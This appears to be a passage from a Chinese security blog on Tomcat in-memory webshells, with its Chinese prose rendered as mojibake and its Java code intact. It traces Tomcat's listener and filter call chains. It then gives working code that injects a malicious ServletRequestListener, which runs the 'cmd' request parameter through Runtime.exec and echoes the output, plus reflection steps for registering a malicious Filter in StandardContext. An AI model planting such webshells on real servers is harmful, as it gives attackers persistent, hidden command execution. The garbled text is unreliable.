<p>servletå®¹å™¨åŠŸèƒ½å¯¹åº”tomcatçš„ç»„ä»¶containerï¼Œä¹Ÿå«Catalinaï¼Œæ˜¯Tomcatçš„æ ¸å¿ƒã€‚åœ¨Containerä¸­ï¼Œæœ‰4ç§å®¹å™¨ï¼Œåˆ†åˆ«æ˜¯Engineã€Hostã€Contextã€Wrapperã€‚è¿™å››ç§å®¹å™¨æˆå¥—å¨ƒå¼çš„åˆ†å±‚ç»“æ„è®¾è®¡ã€‚</p>
<blockquote>
<ul>
<li>Engine<br>
è¡¨ç¤ºæ•´ä¸ª Catalina çš„ Servlet å¼•æ“ï¼Œç”¨æ¥ç®¡ç†å¤šä¸ªè™šæ‹Ÿç«™ç‚¹ï¼Œä¸€ä¸ª Service æœ€å¤šåªèƒ½æœ‰ä¸€ä¸ª Engineï¼Œæœ€é¡¶å±‚å®¹å™¨ç»„ä»¶ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Host</li>
<li>Host<br>
ä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œæˆ–è€…è¯´ä¸€ä¸ªç«™ç‚¹ï¼Œå¯ä»¥ç»™ Tomcat é…ç½®å¤šä¸ªè™šæ‹Ÿä¸»æœºåœ°å€ï¼Œè€Œä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸‹å¯åŒ…å«å¤šä¸ª Context</li>
<li>Context<br>
è¡¨ç¤ºä¸€ä¸ª Web åº”ç”¨ç¨‹åºï¼Œæ¯ä¸€ä¸ªContextéƒ½æœ‰å”¯ä¸€çš„pathï¼Œä¸€ä¸ªWebåº”ç”¨å¯åŒ…å«å¤šä¸ª Wrapper</li>
<li>Wrapper<br>
è¡¨ç¤ºä¸€ä¸ªServletï¼Œè´Ÿè´£ç®¡ç†æ•´ä¸ª Servlet çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒ…æ‹¬è£…è½½ã€åˆå§‹åŒ–ã€èµ„æºå›æ”¶ç­‰</li>
</ul>
</blockquote>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/TxCeD1"><img src="https://s4.ax1x.com/2022/01/06/TxCeD1.png" alt="TxCeD1.png" loading="lazy"></a></figure>
<p>æœ€åçœ‹çœ‹ä¸€ä¸ªrequestçš„æ‰§è¡Œé“¾å¯ä»¥å¤§è‡´ç†è§£</p>
<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/TxCKUK"><img src="https://s4.ax1x.com/2022/01/06/TxCKUK.png" alt="TxCKUK.png" loading="lazy"></a></figure>
<h2 id="listener-å†…å­˜é©¬">listener å†…å­˜é©¬</h2>
<p>è¯·æ±‚ç½‘ç«™çš„æ—¶å€™, ç¨‹åºå…ˆæ‰§è¡Œlistenerç›‘å¬å™¨çš„å†…å®¹ï¼šListener -&gt; Filter -&gt; Servlet</p>
<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/TxCM4O"><img src="https://s4.ax1x.com/2022/01/06/TxCM4O.png" alt="TxCM4O.png" loading="lazy"></a></figure>
<p>Listeneræ˜¯æœ€å…ˆè¢«åŠ è½½çš„, æ‰€ä»¥å¯ä»¥åˆ©ç”¨åŠ¨æ€æ³¨å†Œæ¶æ„çš„Listenerå†…å­˜é©¬ã€‚è€ŒListeneråˆ†ä¸ºä»¥ä¸‹å‡ ç§ï¼š</p>
<ul>
<li>ServletContextï¼ŒæœåŠ¡å™¨å¯åŠ¨å’Œç»ˆæ­¢æ—¶è§¦å‘</li>
<li>Sessionï¼Œæœ‰å…³Sessionæ“ä½œæ—¶è§¦å‘</li>
<li>Requestï¼Œè®¿é—®æœåŠ¡æ—¶è§¦å‘</li>
</ul>
<p>å…¶ä¸­å…³äºç›‘å¬Requestå¯¹è±¡çš„ç›‘å¬å™¨æ˜¯æœ€é€‚åˆåšå†…å­˜é©¬çš„ï¼Œåªè¦è®¿é—®æœåŠ¡å°±èƒ½è§¦å‘æ“ä½œã€‚</p>
<h3 id="listenerçš„å®ç°å’Œç±»å‹">Listenerçš„å®ç°å’Œç±»å‹ï¼Ÿ</h3>
<p>Tomcatä½¿ç”¨ä¸¤ç±»Listeneræ¥å£åˆ†åˆ«æ˜¯org.apache.catalina.LifecycleListenerå’ŒåŸç”ŸJava.util.EvenListenerã€‚</p>
<p>LifecycleListenerå¢åŠ äº†ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œä¸»è¦ç”¨äºå››å¤§å®¹å™¨ç±»StandardEngineã€StandardHostã€StandardContextã€StandardWrapperã€‚ç”¨äºå®¹å™¨çŠ¶æ€çš„åˆ¤æ–­å’Œç®¡ç†ã€‚åœ¨å®¹å™¨åˆå§‹åŒ–çš„æ—¶å€™å¯ç”¨ï¼Œä½†æ˜¯ä½œä¸ºæ”»å‡»è€…æ˜¯ä¸å¯èƒ½æ§åˆ¶å®¹å™¨åˆå§‹åŒ–çš„æ—¶å€™çš„æ“ä½œçš„ã€‚æ‰€ä»¥æˆ‘ä»¬ç›´æ¥çœ‹<strong>EvenListener</strong></p>
<p>å®ƒæ˜¯ä¸€ä¸ªæ¥å£ï¼Œå…·ä½“çš„å®ç°æœ‰å¾ˆå¤š</p>
<figure data-type="image" tabindex="5"><a href="https://imgtu.com/i/TxCUVP"><img src="https://s4.ax1x.com/2022/01/06/TxCUVP.png" alt="TxCUVP.png" loading="lazy"></a></figure>
<p>è¿™é‡Œç›´æ¥é€‰æ‹©<strong>ServletRequestListener</strong>,å› ä¸ºServletRequestListenerç”¨äºç›‘å¬ServletRequestçš„ç”Ÿæˆå’Œé”€æ¯ï¼Œä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬è®¿é—®ä»»æ„èµ„æºï¼Œæ— è®ºæ˜¯servletã€jspè¿˜æ˜¯htmlé™æ€èµ„æºï¼Œéƒ½ä¼šè§¦å‘requestInitializedæ–¹æ³•ï¼Œå½“requestç»“æŸæ—¶ä¼šè§¦å‘Destroyedæ–¹æ³•</p>
<figure data-type="image" tabindex="6"><a href="https://imgtu.com/i/TxCd58"><img src="https://s4.ax1x.com/2022/01/06/TxCd58.png" alt="TxCd58.png" loading="lazy"></a></figure>
<p>è¿™é‡Œåœ¨tomcatä¸­åˆ›å»ºä¸€ä¸ªTestListenerçœ‹çœ‹æ˜¯æ€ä¹ˆæ‰§è¡Œçš„ ,åœ¨System.out.println(&quot;æ‰§è¡Œäº†TestListener requestDestroyed&quot;);è¿™é‡Œæ‰“æ–­ç‚¹</p>
<pre><code class="language-java">package test;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;

public class TestListener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        System.out.println(&quot;æ‰§è¡Œäº†TestListener requestDestroyed&quot;);
    }
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println(&quot;æ‰§è¡Œäº†TestListener requestInitialized&quot;);
    }
}
</code></pre>
<p>å¾—åˆ°å¦‚ä¸‹è°ƒç”¨æ ˆ</p>
<pre><code class="language-java">requestInitialized:13, TestListener (test)
fireRequestInitEvent:5982, StandardContext (org.apache.catalina.core)
invoke:129, StandardHostValve (org.apache.catalina.core)
invoke:81, ErrorReportValve (org.apache.catalina.valves)
invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:364, CoyoteAdapter (org.apache.catalina.connector)
service:624, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1651, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
</code></pre>
<p>ä»requestInitializedå¾€ä¸Šæ¨ï¼Œå¯ä»¥å‘ç°åœ¨standardContext.fireRequestInitEvent()ä¸­å·²ç»æ˜¯testlisteneräº†</p>
<figure data-type="image" tabindex="7"><a href="https://imgtu.com/i/TxC2V0"><img src="https://s4.ax1x.com/2022/01/06/TxC2V0.png" alt="TxC2V0.png" loading="lazy"></a></figure>
<p>å¾€ä¸Šè·Ÿè¸ªå¯ä»¥çœ‹åˆ°listeneræ˜¯ç”±getApplicationEventListenersæ¥çš„ï¼Œå¯ä»¥çœ‹åˆ°fireRequestInitEventè·å–å­˜å‚¨åœ¨StandardContext.ApplicationEventListenersä¸­çš„ç›‘å¬å™¨ï¼Œå¹¶éå†è°ƒç”¨listener#requestInitialized()</p>
<figure data-type="image" tabindex="8"><a href="https://imgtu.com/i/TxChPU"><img src="https://s4.ax1x.com/2022/01/06/TxChPU.png" alt="TxChPU.png" loading="lazy"></a></figure>
<p>getApplicationEventListenersè·å–çš„å€¼ç”±applicationEventListenersListä¸­è·å¾—</p>
<figure data-type="image" tabindex="9"><a href="https://imgtu.com/i/TxCLa6"><img src="https://s4.ax1x.com/2022/01/06/TxCLa6.png" alt="TxCLa6.png" loading="lazy"></a></figure>
<p>applicationEventListenersListåˆå¯ä»¥ç”±addApplicationEventListenerè®¾ç½®</p>
<figure data-type="image" tabindex="10"><a href="https://imgtu.com/i/TxP0dx"><img src="https://s4.ax1x.com/2022/01/06/TxP0dx.png" alt="TxP0dx.png" loading="lazy"></a></figure>
<p>ç»è¿‡ä»¥ä¸Šåˆ†æï¼Œå¤§è‡´äº†è§£ï¼ŒTomcatæ‰§è¡Œåˆ°StandardHostValve#invoke()æ—¶ï¼Œè·å–å­˜å‚¨åœ¨StandardContext.ApplicationEventListenersä¸­çš„ç›‘å¬å™¨ï¼Œå¹¶éå†è°ƒç”¨listener#requestInitialized()ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨StandardContextä¸­<strong>å‘ApplicationEventListenersæ·»åŠ </strong>æˆ‘ä»¬çš„listenerå³å¯æ³¨å…¥ä¸€ä¸ªlistenerã€‚</p>
<p>è¿™ç§æ·»åŠ æ–¹å¼å¯ä»¥ä½¿ç”¨addApplicationEventListener()è®¾ç½®</p>
<h3 id="è·å–standardcontext">è·å–StandardContext</h3>
<p>æ–¹æ³•ä¸€:</p>
<pre><code class="language-jsp">&lt;%
    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
%&gt;
</code></pre>
<p>æ–¹æ³•äºŒ:</p>
<pre><code class="language-jsp">WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
</code></pre>
<h3 id="æ¶æ„ç±»ç¼–å†™">æ¶æ„ç±»ç¼–å†™</h3>
<p>è·å–ä¹‹åå°±å¾ˆç®€å•äº†ï¼Œç›´æ¥æ·»åŠ è‡ªå·±å®šä¹‰çš„æ¶æ„ç±»å°±è¡Œã€‚è¿™é‡Œç»™ä¸ªæˆ‘å†™çš„demo</p>
<pre><code class="language-java">import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
public class tomcat_listen  implements ServletRequestListener {
    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            tomcat_listen listenerDemo = new tomcat_listen();
            standardContext.addApplicationEventListener(listenerDemo);
        }catch (Exception e){
            System.out.println(e);
        }
    }
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        System.out.println(&quot;requestDestroyed success&quot;);
    }
    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        System.out.println(&quot;requestInitialized success&quot;);
    }
}

</code></pre>
<h3 id="æ•ˆæœæ¼”ç¤º">æ•ˆæœæ¼”ç¤º</h3>
<p>è¿™é‡Œè¿˜æ˜¯ä½¿ç”¨spring+log4jçš„é¶åœºæ¼”ç¤º</p>
<figure data-type="image" tabindex="11"><a href="https://imgtu.com/i/TxPcSe"><img src="https://s4.ax1x.com/2022/01/06/TxPcSe.png" alt="TxPcSe.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="12"><a href="https://imgtu.com/i/TxP2yd"><img src="https://s4.ax1x.com/2022/01/06/TxP2yd.png" alt="TxP2yd.png" loading="lazy"></a></figure>
<p>æ³¨å…¥æˆåŠŸåè®¿é—®ä»»æ„ä¸€ä¸ªURLï¼Œä¼šå‘ç°æ‰§è¡Œäº†Listenerçš„requestDestroyedå’ŒrequestInitializedæ–¹æ³•</p>
<figure data-type="image" tabindex="13"><a href="https://imgtu.com/i/TxPhwt"><img src="https://s4.ax1x.com/2022/01/06/TxPhwt.png" alt="TxPhwt.png" loading="lazy"></a></figure>
<p>æœ€åæˆ‘ä»¬å†åŠ ä¸Šå‘½ä»¤æ‰§è¡Œçš„é€»è¾‘å³å¯å›æ˜¾è·å–å‘½ä»¤ï¼Œæ³¨æ„è¿™é‡Œå†™åœ¨requestInitializedä¸­ï¼Œå› ä¸ºresponseåœ¨requestDestroyedä¸­æˆ‘æ²¡æœ‰æ‹¿åˆ°ï¼Œåªèƒ½åœ¨åˆå§‹åŒ–æ—¶è·å–</p>
<pre><code class="language-java">    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        RequestFacade requestfacade= (RequestFacade) servletRequestEvent.getServletRequest();
        Field field = requestfacade.getClass().getDeclaredField(&quot;request&quot;);
        field.setAccessible(true);
        Request lrequest = (Request) field.get(requestfacade);
        Response lresponse = lrequest.getResponse();

        if(lrequest.getParameter(&quot;cmd&quot;) != null){
            Process process = Runtime.getRuntime().exec(lrequest.getParameter(&quot;cmd&quot;));
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            lresponse.getOutputStream().write(stringBuilder.toString().getBytes());
            lresponse.getOutputStream().flush();
            lresponse.getOutputStream().close();
            return;
    }
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ° æ³¨å…¥æ¶æ„ä»£ç åä»»æ„urléƒ½å¯æ‰§è¡Œå‘½ä»¤</p>
<figure data-type="image" tabindex="14"><a href="https://imgtu.com/i/TxPLOs"><img src="https://s4.ax1x.com/2022/01/06/TxPLOs.gif" alt="TxPLOs.gif" loading="lazy"></a></figure>
<h2 id="filter-å†…å­˜é©¬">Filter å†…å­˜é©¬</h2>
<ul>
<li>Filterï¼šç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œåœ¨ç”¨æˆ·å¤„ç†ç±»ä¹‹å‰çš„ï¼Œç”¨æ¥å¯¹è¯·æ±‚è¿›è¡Œé¢å¤–å¤„ç†æä¾›é¢å¤–åŠŸèƒ½çš„ç±»ï¼›æ˜¯ Java ä¸­æœ€å¸¸è§ä¹Ÿæœ€å®ç”¨çš„æŠ€æœ¯ä¹‹ä¸€ï¼Œé€šå¸¸è¢«ç”¨æ¥å¤„ç†é™æ€ web èµ„æºã€è®¿é—®æƒé™æ§åˆ¶ã€è®°å½•æ—¥å¿—ç­‰é™„åŠ åŠŸèƒ½ç­‰ç­‰ã€‚ä¸€æ¬¡è¯·æ±‚è¿›å…¥åˆ°æœåŠ¡å™¨åï¼Œå°†å…ˆç”± Filter å¯¹ç”¨æˆ·è¯·æ±‚è¿›è¡Œé¢„å¤„ç†ï¼Œå†äº¤ç»™ Servletã€‚</li>
</ul>
<h3 id="filterè°ƒç”¨æ ˆ">filterè°ƒç”¨æ ˆ</h3>
<p>è€æ ·å­ï¼Œå…ˆåœ¨tomcatä¸­åˆ›å»ºä¸€ä¸ªfilterçœ‹çœ‹æ˜¯æ€ä¹ˆæ‰§è¡Œçš„</p>
<pre><code class="language-java">package test;

import java.io.IOException;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

public class testFilter implements Filter {

    //tomcatå¯åŠ¨ï¼Œæˆ–è€…contexté‡æ–°åŠ è½½çš„æ—¶å€™è°ƒç”¨initï¼ˆå…ˆdestroyå†initï¼‰
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println(&quot;FirstFilter init...&quot;);
    }
    public void doFilter(ServletRequest request, ServletResponse response,
                         FilterChain chain) throws IOException, ServletException {
        //requeståˆ°è¾¾çš„æ—¶å€™æ‰§è¡Œä¸‹é¢çš„ä»£ç 
        System.out.println(&quot;FirstFilter request&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;);
        //è½¬ç»™è¿‡æ»¤å™¨é“¾ä¸­çš„ä¸‹ä¸€ä¸ªfilterï¼Œå¦‚æœæ˜¯æœ€åä¸€ä¸ªfilterï¼Œè°ƒç”¨è¦è®¿é—®çš„èµ„æº
        chain.doFilter(request, response);
        //è¦è®¿é—®çš„èµ„æºè®¿é—®å®Œä»¥åï¼Œresponseåˆ°è¾¾çš„æ—¶å€™æ‰§è¡Œä¸‹é¢çš„ä»£ç 
        System.out.println(&quot;FirstFilter response&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;);

    }
    //tomcatå…³é—­æˆ–è€…contexté‡æ–°åŠ è½½çš„æ—¶å€™è°ƒç”¨destroy
    public void destroy() {
        System.out.println(&quot;FirstFilter destroy...&quot;);
    }
}

</code></pre>
<p>åœ¨è¿™é‡Œ<code>System.out.println(&quot;FirstFilter request&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;);</code>æ‰“æ–­ç‚¹ã€‚å¾—åˆ°è°ƒç”¨æ ˆ</p>
<pre><code class="language-java">doFilter:23, testFilter (test)
internalDoFilter:194, ApplicationFilterChain (org.apache.catalina.core)
doFilter:167, ApplicationFilterChain (org.apache.catalina.core)
invoke:202, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:544, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:143, StandardHostValve (org.apache.catalina.core)
invoke:81, ErrorReportValve (org.apache.catalina.valves)
invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:364, CoyoteAdapter (org.apache.catalina.connector)
service:624, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1651, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
</code></pre>
<p>åœ¨internalDoFilterä¸­æˆ‘ä»¬çœ‹åˆ°ç›´æ¥è°ƒç”¨äº†filter.doFilteræ–¹æ³•ï¼Œæ­¤æ—¶çš„filterå·²ç»æ˜¯testFilteräº†</p>
<figure data-type="image" tabindex="15"><a href="https://imgtu.com/i/TxiFX9"><img src="https://s4.ax1x.com/2022/01/06/TxiFX9.png" alt="TxiFX9.png" loading="lazy"></a></figure>
<p>å¹¶ä¸”è§‚å¯Ÿåˆ°æ¥æºäºApplicationFilterConfig</p>
<figure data-type="image" tabindex="16"><a href="https://imgtu.com/i/TxiE01"><img src="https://s4.ax1x.com/2022/01/06/TxiE01.png" alt="TxiE01.png" loading="lazy"></a></figure>
<p>æš‚æ—¶æ”¾ä¸‹ç»§ç»­å¾€ä¸Šè·Ÿè¸ª,å‘ç°<code>org.apache.catalina.core.ApplicationFilterChain#doFilter</code>ä¼šè¢«<code>org.apache.catalina.core.StandardWrapperValve#invoke</code>æ–¹æ³•è°ƒç”¨ã€‚åœ¨invokeæ–¹æ³•çš„ä½ç½®è°ƒç”¨<code>filterChain.doFilter</code>ï¼Œå¯¹è¯·æ±‚è¿›è¡Œè¿‡æ»¤æ“ä½œã€‚</p>
<figure data-type="image" tabindex="17"><a href="https://imgtu.com/i/TximtK"><img src="https://s4.ax1x.com/2022/01/06/TximtK.png" alt="TximtK.png" loading="lazy"></a></figure>
<p>è€ŒfilterChainè¿™ä¸ªå±æ€§åˆæ˜¯invokeæ–¹æ³•å†…çš„<code>ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</code>åˆ›å»ºçš„ä¸€ä¸ªè¿‡æ»¤é“¾ï¼Œå°†<code>request, wrapper, servlet</code>è¿›è¡Œä¼ é€’</p>
<figure data-type="image" tabindex="18"><a href="https://imgtu.com/i/TxinfO"><img src="https://s4.ax1x.com/2022/01/06/TxinfO.png" alt="TxinfO.png" loading="lazy"></a></figure>
<p>ç»§ç»­è·Ÿè¸ªcreateFilterChainå‡½æ•°ï¼Œå‘ç°é¦–å…ˆä»ä¸Šä¸‹æ–‡é‡Œå¯»æ‰¾å¹¶ä¸”è¿”å›ä¸€ä¸ªFilterMapæ•°ç»„ï¼Œè¿™é‡Œçš„contextå°±æ˜¯StandardContext</p>
<figure data-type="image" tabindex="19"><a href="https://imgtu.com/i/TxiQ6H"><img src="https://s4.ax1x.com/2022/01/06/TxiQ6H.png" alt="TxiQ6H.png" loading="lazy"></a></figure>
<p>ç„¶ä»éå†è¿™ä¸ªæ•°ç»„ï¼Œ é€šè¿‡ifæ¥åŒ¹é…filterMapé‡Œfilerè®¾ç½®çš„è¿‡æ»¤urlåœ°å€æ˜¯å¦å’Œå‰ç«¯è¯·æ±‚åŒ¹é…, å¦‚æœåŒ¹é…çš„è¯, å…ˆé€šè¿‡filerMapè·å–fiterå, ç„¶åå†å»StandardContexté‡Œè·å–filteråå¯¹åº”çš„filterConfigï¼Œå¦‚æœæˆåŠŸè·å–åˆ°filterConfig, åˆ™å°†filterConfigæ·»åŠ åˆ°filterChainä¸­</p>
<figure data-type="image" tabindex="20"><a href="https://imgtu.com/i/Txi3nA"><img src="https://s4.ax1x.com/2022/01/06/Txi3nA.png" alt="Txi3nA.png" loading="lazy"></a></figure>
<p>contexté‡Œçš„filterConfigåˆæ˜¯æ€ä¹ˆæ¥çš„å‘¢ã€‚æˆ‘ä»¬ç»§ç»­è·Ÿè¿›å»çœ‹çœ‹ï¼ŒfilterConfigsæ˜¯ä¸€ä¸ªhashmapï¼Œåˆå§‹åŒ–çš„æ—¶å€™ ä»é…ç½®(å°±æ˜¯æ‰‹åŠ¨é…ç½®çš„é‚£ä¸ªweb.xmlæ–‡ä»¶)æ–‡ä»¶ä¸­å°è£…äº†filterDefç­‰å±æ€§ï¼ŒfilterDefé‡Œé¢å°±æ˜¯æˆ‘ä»¬é…ç½®çš„filter</p>
<p>æ‰€ä»¥æ•´ä½“å±‚çº§ç»“æ„ä¸ºï¼š<font color="red"><code>standardcontext</code>-&gt;<code>filterConfigs(Map)</code>-&gt;<code>filterConfig</code>-&gt;<code>filterDef</code>-&gt;<code>Filter</code>ã€‚</font></p>
<figure data-type="image" tabindex="21"><a href="https://imgtu.com/i/TxiNh8"><img src="https://s4.ax1x.com/2022/01/06/TxiNh8.png" alt="TxiNh8.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="22"><a href="https://imgtu.com/i/TxiwcQ"><img src="https://s4.ax1x.com/2022/01/06/TxiwcQ.png" alt="TxiwcQ.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="23"><a href="https://imgtu.com/i/Txis7q"><img src="https://s4.ax1x.com/2022/01/06/Txis7q.png" alt="Txis7q.png" loading="lazy"></a></figure>
<h3 id="åˆ†æ">åˆ†æ</h3>
<p>æ ¹æ®ä¸Šé¢çš„æºç åˆ†ææˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœæˆ‘ä»¬æƒ³è¦åŠ¨æ€çš„æ³¨å†Œä¸€ä¸ªfilterï¼Œåªéœ€è¦<strong>å°†è‡ªåˆ›å»ºçš„ <code>Filter</code> æ”¾åˆ° <code>context.filterConfigs</code> å±æ€§ä¸­ï¼Œå¹¶åœ¨ <code>context.filterMaps</code> ä¸­å¢åŠ ä¸€ä¸ª <code>filterName</code> å’Œ <code>URL</code> çš„æ˜ å°„ï¼Œå³å¯å®ŒæˆåŠ¨æ€æ³¨å†Œä¸€ä¸ªFilterã€‚</strong></p>
<p>è€Œä¸”standardcontextä¸­å·²ç»å¸®æˆ‘ä»¬å†™å¥½äº†æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åšçš„æ˜¯æ„é€ filterçš„å±æ€§</p>
<figure data-type="image" tabindex="24"><a href="https://imgtu.com/i/TxiR9U"><img src="https://s4.ax1x.com/2022/01/06/TxiR9U.png" alt="TxiR9U.png" loading="lazy"></a></figure>
<p>æ‰€ä»¥æˆ‘ä»¬ç¬¬ä¸€æ­¥æ˜¯è·å–standardcontext</p>
<pre><code class="language-java">WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
</code></pre>
<p>ç¬¬äºŒæ­¥ï¼Œè®¾ç½®filterConfigs,è¿™é‡Œåˆ©ç”¨åå°„çš„æ–¹å¼å–å‡ºç§æœ‰å±æ€§</p>
<pre><code class="language-java">Field Configs = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredField(&quot;filterConfigs&quot;);
Configs.setAccessible(true);
</code></pre>
<p>ç¬¬ä¸‰æ­¥ï¼Œè·å–å½“å‰çš„filterConfigsä¹Ÿå³è¿‡æ»¤é“¾,ç„¶åå®ä¾‹ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„æ¶æ„filter</p>
<pre><code class="language-java">Map filterConfigs = (Map) Configs.get(standardContext);
Filter filter = new cmd_Filters();
</code></pre>
<p>ç¬¬å››æ­¥ï¼Œæ„é€ filterdefå’ŒfilterMap</p>
<pre><code class="language-java">//æ„é€ filterdef
FilterDef filterDef = new FilterDef();
filterDef.setFilter(filter);
filterDef.setFilterName(name);
filterDef.setFilterClass(filter.getClass().getName());
standardContext.addFilterDef(filterDef);//è¿™é‡Œæ˜¯ä¸Šé¢è°ˆè¿‡çš„standardcontextç»™å‡ºçš„addæ–¹æ³•
//æ„é€ filterMap
FilterMap filterMap = new FilterMap();
filterMap.addURLPattern(&quot;/*&quot;);//è¿™ä¸ªurlæ˜¯æˆ‘ä»¬åœ¨filterç±»ä¹‹å‰ç”³æ˜çš„è¿‡æ»¤url,@WebFilter(&quot;/*&quot;)
filterMap.setFilterName(name);
filterMap.setDispatcher(DispatcherType.REQUEST.name());
standardContext.addFilterMapBefore(filterMap);//è¿™é‡Œä¹Ÿæ˜¯ä¸Šé¢è°ˆè¿‡çš„standardcontextç»™å‡ºçš„addæ–¹æ³•
</code></pre>
<p>ç¬¬äº”æ­¥ï¼ŒgetDeclaredConstructorè¿”å›æ„é€ å¯¹è±¡ï¼Œå‚æ•°å°±æ˜¯æ„é€ å¯¹è±¡çš„å‚æ•°ã€‚è¯´äººè¯å°±æ˜¯ApplicationFilterConfigè¿™ä¸ªç±»å­˜åœ¨æ„é€ å‡½æ•°ç”¨äºå®ä¾‹åŒ–çš„æ—¶å€™åˆå§‹åŒ–æ•°æ®ï¼Œå¯ä»¥é€šè¿‡.class.getDeclaredConstructorçš„æ–¹å¼ä½¿ç”¨è¿™ä¸ªç±»çš„æ„é€ å‡½æ•°ã€‚ç»“æœæ˜¯ä¸€æ ·çš„ã€‚</p>
<pre><code class="language-java">Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);//æœ€åä½¿ç”¨newInstanceå®ä¾‹åŒ–
</code></pre>
<p>ä¸ºä»€ä¹ˆä¸ç›´æ¥newä¸€ä¸ªï¼Ÿå› ä¸ºå¯¹äºæ— è®¿é—®æƒé™ä¿®é¥°ç¬¦ä¿®é¥°çš„æ–¹æ³•ï¼Œåªæœ‰åœ¨åŒä¸€ä¸ªåŒ…ä¸‹çš„ç±»å¯ä»¥è®¿é—®ã€‚æ‰€ä»¥ç›´æ¥new ApplicationFilterConfigä¼šæŠ¥é”™</p>
<figure data-type="image" tabindex="25"><a href="https://imgtu.com/i/TxiW3F"><img src="https://s4.ax1x.com/2022/01/06/TxiW3F.png" alt="TxiW3F.png" loading="lazy"></a></figure>
<p>ç¬¬å…­æ­¥:æ³¨å†Œ,å’Œä¸Šæ–‡åˆ†æçš„StandardContext.filterStartä¸­ä¸€è‡´ï¼Œç›´æ¥æŠŠæˆ‘ä»¬å®Œæˆç»„è£…çš„ä¿¡æ¯putè¿›filterConfigså°±è¡Œ.è¿™é‡Œå·²ç»å®Œæˆäº†å¯¹æ¶æ„Filterçš„æ³¨å†Œ</p>
<figure data-type="image" tabindex="26"><a href="https://imgtu.com/i/Txifc4"><img src="https://s4.ax1x.com/2022/01/06/Txifc4.png" alt="Txifc4.png" loading="lazy"></a></figure>
<pre><code class="language-java">filterConfigs.put(name,filterConfig);
</code></pre>
